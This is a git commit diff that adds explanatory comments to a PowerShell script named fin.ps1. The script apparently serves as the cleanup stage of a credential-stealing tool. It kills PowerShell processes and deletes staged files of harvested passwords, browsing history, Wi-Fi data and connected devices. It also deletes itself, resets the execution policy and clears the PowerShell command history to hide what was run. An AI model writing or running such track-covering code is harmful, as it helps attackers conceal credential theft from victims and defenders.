1a9611eb89b40d4381b4e2534f213d646703f77a
elliotYouKnow <71063979+tuconnaisyouknow@users.noreply.github.com>
2022-03-29 19:22:26 +0200

    Update fin.ps1

--- other_files/fin.ps1
+++ other_files/fin.ps1
@@ -1,10 +1,11 @@
-Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process
-Set-Location C:\Users\Public\Documents
+Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one is running
+Set-Location C:\Users\Public\Documents #Go to public documents location
+#Delete information file
 Remove-Item passwords.txt
 Remove-Item history.txt
 Remove-Item wifi.txt
 Remove-Item connected_devices.txt
 Remove-Item fin.ps1
-Set-ExecutionPolicy restricted -Force
-Clear-Content (Get-PSReadlineOption).HistorySavePath
-taskkill -F /IM powershell.exe
+Set-ExecutionPolicy restricted -Force #Reset script blocker
+Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
+taskkill -F /IM powershell.exe #Kill all powershell process
